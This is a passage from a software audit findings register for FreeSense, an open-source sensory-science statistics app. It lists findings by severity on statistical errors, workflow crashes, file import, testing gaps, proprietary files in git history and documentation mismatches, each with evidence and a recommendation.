  - Through the real app (`apptest_patho.py`): 10 assessors x 2 products x 5 attributes x 2 sessions gave `exception: ['Data must have at least 5 non-missing values.'] | complete: False`. The same design with 3 sessions completed.
  - Stats level (`patho_tb.py`, `patho2.py`): 30 assessors x 2 products x 2 reps also fails. So does 12 assessors x 3 products x 2 reps where one assessor missed one product, which is the unbalanced case the last three commits set out to support. 4 products x 2 reps with one missing session passes.
- Impact: a crash of the core DA workflow for legitimate designs: two-product tests with duplicate sessions, and ordinary 3-product studies with a single missed evaluation. The user sees a Python exception and cannot get any result. The failing code only computes an "approximate" CI that the primary ICC does not need.
- Recommendation:
  - Catch `AssertionError`, or better, guard on `len(sub) >= 5 and sub[replicate_col].nunique() >= 2`, and set the approximate CI to NaN.
  - Add an AppTest for 2 products x 2 sessions and for 3 x 2 with one missing assessor x product cell.
  - See PERF-03: removing this block from the Run path also removes three quarters of DA run time.
- Effort: S
- Dependencies: none


## HIGH

### STAT-01: Cluster ANOVA tests the partition it was built from, so "significant" stars appear on pure noise
- **Register status: final severity HIGH. Challenge: reproduced (pass A); challenger suggested MEDIUM; kept HIGH by lead: ★ significance on pure noise, no caveat.** (source: `B01-statistical-correctness.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `stats/segmentation.py:57-93` (`_cluster_anova`), called from `compute_ahc_clusters` (l.211) and `compute_kmeans_clusters`; rendered as ★ markers by `modules/liking/workflow.py:114-139` (`_cluster_profile_caption`), l.1505-1540 (AHC tab) and the k-means tab.
- Evidence: the one-way ANOVA per product compares the clusters on the same liking scores the clusters were formed from. Script `t_seg.py`: 20 datasets of 100 consumers x 6 products, iid N(6, 1.5) rounded to 1 to 9, no segment structure. AHC (Ward, k = 2, raw scores) flagged `[5, 4, 3, 5, 3, 5, 3, 3, 3, 4, 4, 5, 4, 6, 5, 5, 4, 3, 4, 2]` of 6 products significant at alpha = 0.05. A valid test would flag about 0.3 per dataset. The caption says "★ = product liking differs significantly across segments (one-way ANOVA on raw scores, p < α)" with no caveat; `Statistical_Methods_README.md` (around l.1610) presents the ANOVA as the test of absolute level without mentioning selection.
- Impact: users will read ★ as evidence that segments genuinely differ in liking of a product. The p-values are invalid by construction (post-selection inference); they will be significant for almost any partition, including noise. This can drive product or segmentation decisions.
- Recommendation: stop presenting these as inferential tests. Either drop the p-values/stars and show effect sizes (between-cluster range, eta²) labelled descriptive, or state plainly next to the chart that the tests are descriptive because the clusters were formed to differ. If an inferential check is wanted, use a split-sample or permutation-of-the-whole-clustering procedure.
- Effort: S (caveat and relabel) / M (valid alternative)
- Dependencies: none

### STAT-02: Liking contrast uses df = n_consumers - n_products, disagreeing with the CLD and with the correct RCBD df
- **Register status: final severity HIGH. Challenge: reproduced (pass A); challenger suggested MEDIUM (HIGH for panels under about 30); kept HIGH by lead: wrong df and Hedges' g of 0 at small n.** (source: `B01-statistical-correctness.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `stats/liking.py:289-290` (`df_satterthwaite = max(1, n_c - n_p)`); consumed by `stats/contrast.py:292-312` (Liking contrast p-value, CI, HSD critical value, Hedges' J) and `stats/contrast.py:628-640` (FDR family); `compute_liking_cld` (`stats/liking.py:786-814`) instead uses a per-pair Welch formula.
- Evidence (`t_lik.py`): balanced synthetic panels, 10 consumers x 6 products. The contrast uses df = 4; the CLD uses per-pair df of about 2(n-1) = 18; the correct residual df of the balanced RCBD (equal to lme4/emmeans Satterthwaite on complete data) is (10-1)(6-1) = 45. The SEs agree exactly (LMM 0.5193 vs RCBD 0.5193), so only the df differs. P2 vs P5: p = 0.0255 at df 45 against 0.0820 in the contrast. Across 30 datasets x 3 post-hoc methods x all reference/comparison pairs, the contrast's significance disagreed with the CLD letters in **442 of 2700** comparisons (16%). When n_consumers <= n_products + 1 the df floors at 1, and the Hedges' g correction `J = 1 - 3/(4·df - 1)` becomes 0, so g is reported as 0 for every pair. The hedochoc validation cannot catch this because at 222 consumers every df choice gives the same decisions.
- Impact: in small or moderate consumer panels (pilot tests, trained-panel hedonics, central-location tests with many products) the contrast step is heavily conservative, and it contradicts the CLD shown in the previous step. This is the old F-16 finding. It is only partly fixed: the CLD moved to per-pair df, but the contrast did not, and neither uses the RCBD df. The UI caption "Fallback degrees of freedom" (`modules/liking/workflow.py:1001-1007`) hides that the contrast uses the fallback df as its **primary** df.
- Recommendation: derive one df for both CLD and contrast. For complete data use (n_c - 1)(n_p - 1). For incomplete data compute Satterthwaite or Kenward-Roger per contrast, or use the containment df from an OLS RCBD fit. Remove the per-pair Welch formula, which treats LS means as independent groups. Fix Hedges' J to use a df consistent with the SD used.
- Effort: M
- Dependencies: none (lead (a) from another reviewer confirmed)

### STAT-04: PLS CV Q² collapses when a predictor is constant inside a training fold (in-fold scaling divides by ~1e-17)
- **Register status: final severity HIGH. Challenge: reproduced (pass A); beta module.** (source: `B01-statistical-correctness.md`)
- Severity: HIGH (beta module)
- Confidence: VERIFIED
- Location: `stats/pls.py:325-331` (`x_sd = np.where(np.isfinite(x_sd) & (x_sd > 0), x_sd, 1.0)`, same for `y_sd`), used by Q², permutation test and bootstrap CI.
- Evidence (`t_pls.py`, `t_pls2.py`): n = 8 products, 4 predictors, one predictor non-zero in a single product (for example an ingredient in only one recipe). After global autoscaling, the LOO fold that omits that product has a column whose in-fold SD is 6.0e-17, not 0, so the guard passes and the column is multiplied by ~1e16. Over 20 seeds, `fit_pls(...)['q2']` against an independent LOO: seed 4 gives -14.519 vs 0.889, seed 9 gives -11.046 vs 0.560, seed 2 gives -2.547 vs 0.733 (median absolute difference 0.46). Changing only the guard to `> 1e-10` reproduces the independent values exactly for every seed. No warning is raised: the per-fold effective-rank cap sees a full-rank scaled matrix.
- Impact: Q², the Q²-per-component curve used for component selection, and the permutation p-value can be grossly wrong, with no warning, on composition or formulation blocks where an ingredient appears in one product. That is a common Fusion input.
- Recommendation: use a relative tolerance (for example `x_sd > 1e-8 * max(1, global_sd)`). Better, drop constant-in-fold columns from that fold's fit and prediction. Add a regression test with a one-product indicator column.
- Effort: S
- Dependencies: none

### STAT-05: Consumer segmentation with "standardise" on crashes when any consumer rates every product the same
- **Register status: final severity HIGH. Raised MEDIUM to HIGH by lead: independently reproduced by pass A; straight-lining consumers are common, the step crashes.** (source: `B01-statistical-correctness.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (stats layer); SUSPECTED for the exact UI rendering
- Location: `stats/segmentation.py:27-35` (`_standardise_rows` z-scores rows, and a flat rater gives NaN); `compute_ahc_clusters` l.193 and `compute_kmeans_clusters` l.294; call sites `modules/liking/workflow.py:1357-1364` and around l.1574 have no try/except.
- Evidence: 60 x 6 random matrix with one row set to 7. `compute_ahc_clusters(..., standardise=True)` raises `ValueError: The condensed distance matrix must contain only finite values`. `compute_kmeans_clusters(..., standardise=True)` raises `ValueError: Input X contains NaN`. Both succeed with `standardise=False`. A random-noise run on integer 1 to 9 scores also hit this by chance (`t_seg.py`).
- Impact: flat raters are common in consumer panels. Turning the toggle on raises an uncaught exception in Step 4 (Inferred: Streamlit shows a traceback).
- Recommendation: exclude zero-variance consumers before standardising, report how many were excluded (they carry no pattern information), and guard the call site.
- Effort: S
- Dependencies: none

### FUNC-02: DA crashes with a raw traceback when no attribute column is numeric (for example decimal-comma CSV)
- **Register status: final severity HIGH. Challenge: reproduced (pass A).** (source: `B02-functional-workflow.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `stats/panel_performance.py:551` (`compute_scale_usage`), reached from `modules/descriptive/workflow.py:76,393`; Step 1 has no numeric check (`modules/descriptive/workflow.py:255-340`, `modules/descriptive/ui.py:69-142`)
- Evidence: `data/eu_comma_quoted.csv` (comma-separated, values such as `"7,5"`). DA, map Panelist/Product/Session, scale 0 to 10. Step 1 shows only "**480 blank cells detected** across 5 attribute columns ... treats a blank as a missing observation". Clicking Run gives an exception element `KeyError: 'mean_bias'` with a stack trace (`client.showErrorDetails` is `full`, so the user sees the full traceback). The same happens for any file whose attribute columns are all text.
- Impact: a European Excel user (decimal comma is the default in DE/FR/IT/ES/NL/Nordics locales) sees a Python traceback after being told the cells are merely "blank". Core workflow crash.
- Recommendation: in DA Step 1, detect attribute columns that are mostly non-numeric (as RATA does) and block with a message naming the likely cause ("these columns contain text such as '7,5'; if your file uses decimal commas, re-save it with a decimal point or ..."). Better still, accept decimal commas in `load_data` (see FUNC-05). Also make `compute_scale_usage` return an empty frame rather than raising when nothing is numeric.
- Effort: S
- Dependencies: FUNC-05

### FUNC-03: Duplicated rows silently change DA results
- **Register status: final severity HIGH. Challenge: reproduced (pass A).** (source: `B02-functional-workflow.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `modules/descriptive/ui.py:69-142` (`validate_da_design` has no duplicate check); `stats/da_anova.py`
- Evidence: `data/dup_rows.csv` is `small.csv` concatenated twice (a typical copy/paste or double-export error). DA Step 1 shows no warning at all (metrics still say 12 assessors, 4 products, 2 replicates). The ANOVA changes materially (`checks1.py`):
  ```
  small: MilkF F_product 64.98, df_error 48, tested_against Residual, p_interaction 0.113
  dup:   MilkF F_product 44.43, df_error 33, tested_against Interaction, p_interaction 3.1e-10
  ```
  Every attribute's interaction becomes "significant" and the error term switches. RATA is unaffected in substance (cells are averaged, `modules/rata/ui.py` warns only when no replicate is mapped).
- Impact: wrong inference (interaction, error-term choice, repeatability, panel performance) from a common data-entry error, with no warning.
- Recommendation: in DA (and for consistency RATA/Liking/CATA) Step 1, count rows duplicated on assessor x product x replicate and block or warn with the count and example rows.
- Effort: S
- Dependencies: none

### STAT-13: DA empty-cell ANOVA takes its residual and interaction SS from a rank-deficient `statsmodels` OLS fit, so F and p are slightly wrong and differ between machines
- Severity: HIGH (silent wrong result; platform-dependent, so results cannot be reproduced)
- Confidence: VERIFIED
- Location: `stats/da_anova.py:320-330` (the replicated path with empty assessor x product cells: `ss_err = full_model.ssr`, `ss_int = add_model.ssr - full_model.ssr`); also `stats/da_anova.py:526` (`compute_da_diagnostics` fits the same rank-deficient model for residuals). `tests/test_unbalanced_designs.py::test_anova_with_empty_cells_uses_the_additive_model` checks it only to `rel=1e-3`, against the same kind of fit.
- Evidence (fixture `_design()` in `tests/test_unbalanced_designs.py`: 4 products x 10 assessors x 2 replicates, 3 empty cells, 37 non-empty cells, n = 74):
  - With empty cells, the interaction model `C(Prod, Sum) * C(Assessor, Sum)` has 40 columns but rank 37. `smf.ols` solves it with `pinv(rcond=1e-15)`. Its singular values include noise-level values just above the 1e-15 x max cutoff, and inverting them amplifies rounding error.
  - The exact residual SS (the within-cell SS, which `numpy.linalg.lstsq` or `pinv(rcond=1e-12)` also give) is **4.901308**. `statsmodels` returns **4.909161** with Sum coding (production) and **4.905125** with treatment coding.
  - Exact values: F_product = **354.7876** (tested against Residual, df 3 and 37), F_interaction = 1.1448, p_interaction = 0.3483.
  - Production gives F_product **354.22** on the maintainer's machine (Python 3.14 and a locally built 3.12, same lock) and **352.303** on GitHub's `ubuntu-latest`, Python 3.12.14. p_interaction is 0.3521 locally. The versions are identical, so the difference comes from the CPU/BLAS path. It makes the Stage 1 CI job fail (`assert 352.303 == 354.7876 ± 0.3548`).
- Impact:
  - On the empty-cell DA path, every quantity derived from the residual or interaction MS carries an error of unknown size: the F and p for product, assessor and interaction, the conditional-pooling decision, and the post-hoc, CLD and contrast SEs, which read the error MS from `full_df`.
  - The error depends on the machine, so the same file gives different numbers on different computers.
  - In the fixture the error is under 1% and no decision changes, but nothing bounds it: it scales with 1/(noise singular value). Complete designs are full rank and unaffected, so the sensochoc pins stay bit-identical.
- Recommendation:
  - Compute the residual SS exactly as the within-cell SS (deviations from cell means), with df = n - (number of non-empty cells).
  - Take the interaction SS as `add_model.ssr - ss_within`, with df = `add_model.df_resid` - df_within, when positive.
  - Do not fit the rank-deficient interaction model at all. For `compute_da_diagnostics`, residuals from the cell means are the same quantity.
  - Check the other `smf.ols` sites (`stats/panel_performance.py:212`, `:743`) for rank deficiency under missing cells.
  - Test: F, p and MS for the fixture equal the exact values above to 1e-10, and the existing test is replaced by that exact check (not loosened).
- Effort: S
- Dependencies: none
- Status: **fixed in Stage 1** (2026-09-27). `stats/da_anova.py` now uses `_within_cell_ss` and `_cell_means`; exact-value tests are in `tests/test_unbalanced_designs.py`.

### FUNC-05: File reading is brittle and failures are silent or unintelligible (delimiter, decimal comma, encoding, .xls, .CSV)
- **Register status: final severity HIGH. Challenge: reproduced (pass A); absorbs IO-03, IO-04.** (source: `B02-functional-workflow.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `core/data.py:7-37` (`load_data`); uploaders in `modules/descriptive/workflow.py:109`, `modules/rata/ui.py:108`, `modules/cata/ui.py:369,616` accept `xls`
- Evidence (`load_check.py` and AppTest `run_bad.py`):
  - `;`-separated file (`data/eu_semicolon.csv`, Excel's CSV default in most of continental Europe): loads as **one** column `Panelist;Session;Product;...`. Step 1 shows no error; the mapping selectbox simply offers that one string. Same for a tab-separated `.csv` and a file with a title row above the header (`title_row.csv`: single column "Study XYZ export 2026").
  - Decimal commas: see FUNC-02 (DA crash) and FUNC-06 (RATA message).
  - Latin-1 file with umlauts (`latin1.csv`): `Error loading file: 'utf-8' codec can't decode byte 0xfc in position 61: invalid start byte`.
  - `.xls`: uploaders advertise it but `xlrd` is not in `requirements.txt` or the venv; any real `.xls` gives `Error loading file: Missing optional dependency 'xlrd'. Install xlrd >= 2.0.1 for xls Excel support Use pip or conda to install xlrd.`
  - `SMALL.CSV`: `load_data` tests `name.endswith('.csv')` case-sensitively, so it goes to `read_excel`: `Error loading file: Excel file format cannot be determined, you must specify an engine manually.` (Inferred: Streamlit's uploader accepts `.CSV` for `type=["csv"]`; not tested in a browser.)
- Impact: the first contact for many European users is either a silent one-column mapping screen or a developer-facing error. None of the messages tells a sensory scientist what to do.
- Recommendation: sniff the delimiter (`sep=None, engine="python"` or `csv.Sniffer`), accept `decimal=","` when the sniffed delimiter is `;`, fall back from UTF-8 to cp1252/latin-1, compare extensions case-insensitively, and either add `xlrd` or drop `xls` from every uploader's `type`. When the parsed frame has one column, show "Only one column was found; your file may use ';' or tabs as separator, or have a title row above the headers".
- Effort: S to M
- Dependencies: decision on supported file formats

### IO-02: Decimal-comma numbers are silently zero-filled (RATA), dropped (DA) or dropped as whole columns (means tables)
- **Register status: final severity HIGH. Challenge: partly reproduced (pass A): a mixed decimal-comma column in a means table does warn, but blames missing values; rest holds. Absorbs FUNC-06.** (source: `B03-import-export.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `core/data.py:199-214`, `core/data.py:103-109` (`load_precomputed_means`, 50 % coercion rule), RATA blank-cell warning `modules/rata/ui.py` Step 1
- Evidence: sensochoc with 35 of 348 `CocoaA` cells written as `"7,5"` (a comma-delimited CSV with quoted decimal-comma cells, or a column Excel stored as text).
  - RATA: no error. The warning reads "35 blank cells detected … filled with 0". After the run, `CocoaA` has 36 zeros instead of 1: every 7.5 became 0.
  - DA: "35 blank cells detected … treated as missing observation". The values are dropped from the ANOVA.
  - The text-column check only fires above 50 % non-numeric, and the scale-range check (`core/upload_validation.py:63`) coerces first, so neither catches it.
  - Means table (`load_precomputed_means`, `fmt2.py`): a column that is all decimal-comma (`Sour`) stays object dtype and is silently left out, because the Fusion/PrefMap validators keep only numeric columns (`modules/fusion/workflow.py:536`, `modules/prefmap/workflow.py:338`). Mixed columns get NaN cells. `nan_affected` is returned, but no caller reads it (grep: only the tuple unpacking at `fusion/workflow.py:363` and `prefmap/workflow.py:313`), so the NaN warning the docstring promises is never shown.
- Impact: European-locale users lose or zero real ratings. The only message calls them "blank". For RATA this changes means, LMM and CLD without a correct warning.
- Recommendation: before coercion, count cells that are non-empty strings but fail `to_numeric`. Report them separately from true blanks, naming the column and example values. Block the run when they match `^\d+,\d+$`, and offer "interpret comma as decimal separator". Never zero-fill a non-empty unparseable cell. Surface `nan_affected` and any dropped non-numeric columns in Fusion/PrefMap.
- Effort: M
- Dependencies: IO-03

### TEST-02: Nearly half the shipped statistical methods have no known-answer test
- **Register status: final severity HIGH. Challenge: reproduced (pass B); challenger suggested MEDIUM; kept HIGH by lead: B01 found defects (STAT-01/02/03/04) precisely in untested paths.** (source: `B05-testing.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: coverage matrix above; `validation/README.md` "Not reference-validated (yet)"
- Evidence: every one of these renders results to users and writes them into the Excel export. None has a test that compares against an externally produced number. Their tests either run the function via AppTest and assert only no-exception, wiring or column conventions, or they pin a value FreeSense itself produced:
  - CATA: `run_cata_contrast`, `compute_penalty` (the Welch t machinery is validated only through JAR), `compute_ca_ellipses`, `build_cld_from_mcnemar`, `wilson_ci`.
  - DA/RATA:
    - `multivariate.calculate_pca`, `run_cva`, `calculate_panel_stability`: the matrix labels them "STRUCT only". `calculate_pca` calls sklearn `PCA` directly (`stats/multivariate.py` about line 123); the PrefMap pin covers the separate `compute_pca_scores`.
    - `varimax`: never executed by any test.
    - `contrast.compute_contrast`.
    - Panel-performance discrimination, agreement/RV and scale usage: the sensochoc pins in `test_panel_performance_summary.py` are derived from the current code.
  - DA Type III with unequal replication and no empty cells. The DA pin uses balanced sensochoc, where Type I = II = III, so the Sum-coding Type III path is never distinguished. I checked it by hand (`B05/t3.py`, 8 assessors × 4 products, replication 1 or 3 per cell). FreeSense gives `F_product = 21.246` against the interaction term with df 21. statsmodels `anova_lm(typ=3)` with Sum coding gives MS_Product / MS_Interaction = 21.2455. So it is correct today but unprotected.
  - Liking: `compute_twoway_anova_demo` (the README says it was spot-checked once, but there is no harness), `compute_jar_penalty_long`, `compute_jar_distribution`, and `segmentation.compute_demographic_association` (never executed).
  - PrefMap: `compute_preference_surface`.
  - PLS: jackknife, permutation test and `compute_cv_coefficient_stability`. The only permutation test asserts `p < 0.05` on a synthetic fixture.
  - RATA: the LMM is validated only on DA intensities with no blanks. The RATA-specific zero-filling of unticked cells feeding the LMM is covered only by `test_da_blank_fill.py::test_rata_always_zero_fills`, which checks the fill, not any statistic computed on filled data.
- Impact: these methods could give wrong numbers without any test failing. Several are headline outputs: the DA/RATA PCA and CVA maps, CATA penalty analysis, CATA contrast and panel performance. For a sensory-science audience these figures go into reports.
- Recommendation: add known-answer tests in pure Python where the reference is a closed form or a scipy/statsmodels call, so no R is needed. The priority list is in "Minimum test set" below. For PCA/CVA, reuse the FactoMineR-anchored approach already used for PrefMap.
- Effort: M overall (most tests are S each)
- Dependencies: none

### SEC-04: Third-party proprietary files are in the git history (XLSTAT tutorial workbook with macros, training slides, a PDF)
- **Register status: final severity HIGH (BLOCKER if made public). Challenge: reproduced (pass B, facts); BLOCKER before the repository or its history is made public (D-03); absorbs REL-02.** (source: `B07-security-privacy.md`)
- Severity: HIGH (if the GitHub repository is or will become public); presence VERIFIED, licensing status SUSPECTED
- Confidence: VERIFIED (files and metadata); SUSPECTED (that redistribution is not permitted)
- Location: git history only, none in the current tree. `example_data/LIK_tuto_EN.xlsm` (added `acf8ffa` 2026-03-27, removed `01065d1` 2026-04-23); `PLS.pptx` (added `fd50b56`, removed later); `docs/PLS.pdf` (added `1a6d701`, 1.7 MB); also `Rplots.pdf`, `validation/PrefMap/_out/carto_reference.pdf`, `notebooks/pls_validation.ipynb`.
- Evidence: `git show acf8ffa:example_data/LIK_tuto_EN.xlsm` : `docProps/core.xml` creator "Fabien Llobell", 26 worksheets named `XLSTAT_20220318_...`, contains `xl/vbaProject.bin` (92 KB VBA macros). `PLS.pptx` slide text: "XLSTAT PLS set up ... XLSTAT Recommends ...", creator "Gemma", created 2017. `docs/PLS.pdf` provenance not established (no readable metadata). History is pushed to `origin` (`https://github.com/Sesnor-y/FreeSense.git`); repo visibility could not be checked (`gh` not installed).
- Impact: anyone cloning a public repo can recover these files with `git show`. Redistributing a vendor tutorial workbook and third-party training slides is plausibly outside their licence; the xlsm also ships macros in a scientific repo's history.
- Recommendation: confirm provenance and permission for each; if not clearly redistributable, rewrite history (`git filter-repo --path ... --invert-paths`) before the repository is made public or released, and force-push with notice to any clones. Decide together with the home-path and data-file-name cleanup in SEC-08 so history is rewritten once.
- Effort: S (rewrite) to M (coordination)
- Dependencies: D-B07-3; overlaps B08 (licensing)

### REL-01: The GitHub repository is private, so README's clone command and citation URL fail for every user
- **Register status: final severity HIGH. Challenge: reproduced (pass B).** (source: `B08-packaging-licensing.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `README.md:45` (`git clone https://github.com/Sesnor-y/FreeSense.git`), `README.md:425` (citation URL)
- Evidence: `curl -o /dev/null -w "%{http_code}" https://github.com/Sesnor-y/FreeSense` -> `404`; the owner page `https://github.com/Sesnor-y` -> `200`; `GIT_TERMINAL_PROMPT=0 git -c credential.helper= ls-remote https://github.com/Sesnor-y/FreeSense.git` -> `fatal: could not read Username`. `api.github.com/repos/Sesnor-y/FreeSense` -> 404. Authenticated `git ls-remote origin` works, so the repository exists and is private (Inferred; a deleted repo would fail authenticated too).
- Impact: the installation instructions and the recommended citation point at a URL that returns 404 for anyone but the owner. A paper citing it would carry a dead link. This is also the precondition for REL-02: making the repository public today would publish its full history.
- Recommendation: decide the distribution channel (Decisions raised). If the code is to be public, publish a repository whose history has been cleaned (REL-02) and only then make the README URLs true. If it stays private, replace the clone/citation instructions with whatever route users will actually get the code by.
- Effort: S (once the decision is made)
- Dependencies: REL-02, decision D1

### DOC-01: Statistical methods reference contradicts the implemented code in places a user would copy into a methods section
- **Register status: final severity HIGH. Challenge: reproduced (pass B): 10 of 10 contradictions hold (item 6 weak).** (source: `B09-documentation.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `Statistical_Methods_README.md` sections 8, 15, 16, 23a, 23c, 24, 27, 48, 51
- Evidence (each checked against the code):
  1. §16 "FDR and LSD in the DA context" (lines 843-855) says n_i, n_j in the pairwise SE are "the number of assessors (unique, not observations)" and that using observation counts "inflat[es] false positive rates". The code does the opposite: `stats/posthoc.py:144-157` `_observation_counts` returns `groupby(product).size()` (J x R), and its docstring says `nunique(assessor)` would be wrong. §5a (line 269) describes the code correctly, so the document contradicts itself. §23a (line 1283) repeats the stale "number of unique assessors" for the DA contrast SE, while `stats/contrast.py:424-425,706-707` uses `_observation_counts`.
  2. §23c "Note on family size" (lines 1323-1324) says the contrast BH family is only the selected comparison products. `stats/contrast.py:578-610` corrects over the full C(n,2) pair family (B.23 / F-03), as README line 267 and §25 say.
  3. §24 "Why ML, not REML" (lines 1449-1451) says the Liking LMM is fitted by ML. `stats/liking.py:228-246` fits REML for the LS means and their covariance and ML only for the LRT (the module docstring, lines 9-13, and README line 255 agree with the code).
  4. §24 has a heading "Satterthwaite Degrees of Freedom" (line 1459) for `df = n_consumers - n_products`, which is not a Satterthwaite approximation (the code also names it `df_satterthwaite`, `stats/liking.py:705`). A user reporting "Satterthwaite df" would misreport.
  5. §8 "Missing-cell caveat" (line 356) says PCA/CVA pivots use `fillna(0)` in `stats/multivariate.py`. `grep -n fillna stats/multivariate.py` returns nothing. The current behaviour (leave incomplete attributes out and say so) is in CHANGELOG `[Unreleased]` and CLAUDE.md.
  6. §15 formula blocks (lines 687-689, 698-700) show `intensity ~ C(Product) + C(Assessor)` (treatment coding). The code uses `C(Prod_Safe, Sum)` (`stats/da_anova.py:224, 292`).
  7. §15 (line 710) calls Type III with effect coding "the recommended convention in Langsrud (2003)". Langsrud (2003) is titled "Use Type II instead of Type III sums of squares"; the reference note at line 817 admits FreeSense departs from it. The body text misattributes the recommendation.
  8. §51 (lines 2691, 2712) says CA bootstrap default B = 200 and "increase to 1000+ for publication graphics", and line 2711 mentions "ellipse-confidence sliders". The app hard-codes 500 resamples, seed 42, confidence 0.95 (`modules/cata/ui.py:2157-2158, 2340-2342`; `stats/cata.py` docstring "n_boot : int, default 500"). The user cannot change any of them.
  9. §27 "Test Selection Logic" (line 1647) says the permutation test uses 10,000 permutations. `stats/segmentation.py:24` `DEFAULT_PERMUTATION_N = 999`, and the only caller (`modules/liking/workflow.py:1253`) does not override it. The k-means `random_state=42` is not documented (only `n_init=50`).
  10. §48 (line 2593) lists correction methods "BH (default), BY, Bonferroni, and Holm". The UI offers `["FDR (Benjamini-Hochberg)", "Bonferroni", "Holm", "Uncorrected"]` (`modules/cata/ui.py:118`): no BY, and "Uncorrected" is not documented.
- Impact: the numbers the app produces are not affected. But this document is the only source a sensory scientist has for writing "analysed with FreeSense using ...". Items 1, 3, 4 and 8 would lead to a wrong methods description in a manuscript, and item 1 tells a reviewer that the implemented DA post-hoc is anti-conservative. That undermines trust in a tool whose selling point is statistical transparency.
- Recommendation: fix the ten passages above. Then add a check to `tests/`: a small table of documented defaults (bootstrap B, seeds, permutation counts, n_init, correction option lists, alpha_interaction default) asserted against the constants in code, so the two cannot drift again.
- Effort: M
- Dependencies: DOC-03 (same pattern for alpha_interaction); B01 for whether df = n_consumers - n_products is the right df.


## MEDIUM

### STAT-03: RATA Tukey contrast uses a different error term from the RATA Tukey CLD
- **Register status: final severity MEDIUM. Challenge: reproduced (pass A); downgraded HIGH to MEDIUM: the CLD (primary output) is correct, the contrast view disagrees on 16/420 pairs.** (source: `B01-statistical-correctness.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `stats/contrast.py:447-491` (RATA path: paired SE, df = n-1, studentized range with k_total) against `stats/posthoc.py:177-258` (`_rcbd_tukey_decisions`: pooled RCBD residual MS, df (J-1)(P-1)); docstring `stats/contrast.py:23-24` claims flags always match `generate_cld()`.
- Evidence (`t_cons.py`, sensochoc run as RATA, all 6 references x 5 comparisons x significant attributes, 420 pairs): Tukey had **16 mismatches** between contrast `significant` and the pairwise/CLD `Reject H0`, in both directions. Examples: MilkF choc1 vs choc2, CLD adj p = 0.163 (not significant), contrast significant; Sticky choc1 vs choc3, CLD adj p = 0.016 (significant), contrast not significant. FDR and LSD had 0 mismatches for RATA. DA had 0 mismatches for all three methods.
- Impact: in RATA with Tukey selected, the contrast chart and the CLD letters can contradict each other for the same pair. The RCBD Tukey path is the one validated against emmeans, so the contrast is the wrong one.
- Recommendation: in the RATA Tukey branch of `compute_contrast`, reuse `_rcbd_tukey_decisions`' error MS and df (or call it) for both the ribbon half-width and the decision. Add a test asserting contrast-vs-CLD agreement for every module x method, like `t_cons.py`.
- Effort: S
- Dependencies: none

### STAT-06: DA with a replicate column that has a single session: every attribute ends in an error row
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B01-statistical-correctness.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `stats/da_anova.py:285-298` (the interaction model always runs when `replicate` is mapped); validator `modules/descriptive/ui.py:109-117` only warns that ICC is unavailable.
- Evidence (`t_da2.py`): sensochoc restricted to Session 1 with `replicate='Session'` mapped. Every attribute returns `significant='Error'` with status `error: r_matrix performs f_test for using dime...`. No CLD, contrast or letters follow. The same data with replicate unmapped analyses correctly.
- Impact: a user who maps a session column that happens to be constant (a single-session study, or a filtered file) gets an empty analysis and a cryptic status hidden in an expander. The driver scatter shows only "no valid p-values".
- Recommendation: when every assessor x product cell has one observation, treat the design as non-replicated (set `replicate=None` for the ANOVA) and say so. Also handle partially replicated designs where residual df is tiny.
- Effort: S
- Dependencies: none

### STAT-08: MDPREF silently mean-imputes missing consumer x product cells
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B01-statistical-correctness.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `modules/liking/workflow.py:3052-3056` and `3220-3221` (`liking_wide.fillna(liking_wide.mean(axis=0))`); `stats/mdpref.py` requires imputation by the caller.
- Evidence: code read. No UI text or `Statistical_Methods_README.md` passage mentions imputation (grep for "imput" finds only the code comment). The Liking module accepts incomplete designs (balance report, `pct_missing_cells`).
- Impact: in incomplete-block consumer tests each consumer's unseen products are placed at their personal mean. That shrinks product separation on the map and biases consumer vectors, with nothing telling the user. It also contradicts the project's stated principle of never filling missing cells before a PCA.
- Recommendation: disclose the imputation and its extent (the share of cells imputed). Prefer excluding consumers below a completeness threshold, or use an EM/iterative PCA (missMDA-style).
- Effort: S (disclose) / M (method)
- Dependencies: none

### FUNC-07: The shipped PrefMap consumer file cannot be used by PrefMap, and the error does not explain why
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B02-functional-workflow.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `modules/prefmap/workflow.py:546-600`; `example_data/05_Fusion_PrefMap/Cocktail_consumer_liking.xlsx`; `example_data/README.md` ("Use: the consumer block for PrefMap")
- Evidence: PrefMap, sensory = `Cocktail_sensory_means.xlsx`, consumer = "Upload raw consumer liking scores", file = `Cocktail_consumer_liking.xlsx` (long: consumer, product, liking). Result: `Only 1 numeric consumer columns found. Expected at least 5 consumers. Check that columns represent individual consumers and the product column is correctly selected.` The product-column selectbox defaults to the first column (`consumer`). The path expects wide format (products x consumers). The repo's own test pivots the file before feeding it (`tests/test_apptest_prefmap.py:34-37`), so the test suite never exercises the shipped file as a user would. After pivoting (`run_prefmap.py`) the whole PrefMap workflow and export work. Uploading the same long file as Fusion's external block gives "Different number of products: sensory (16) vs external (1600)".
- Impact: the documented example fails; the message does not mention long versus wide layout. The Liking module takes long format, so users will reasonably try the same layout here.
- Recommendation: accept long format (consumer/product/liking mapping, pivot internally), or at minimum detect it (few numeric columns, many repeated product values) and say "this looks like long format; PrefMap needs one row per product and one column per consumer". Ship a wide copy or fix the README.
- Effort: S to M
- Dependencies: none

### FUNC-08: After switching modules, the uploaded file is gone from Step 1 although results remain, and changing any setting forces a full re-upload
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B02-functional-workflow.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
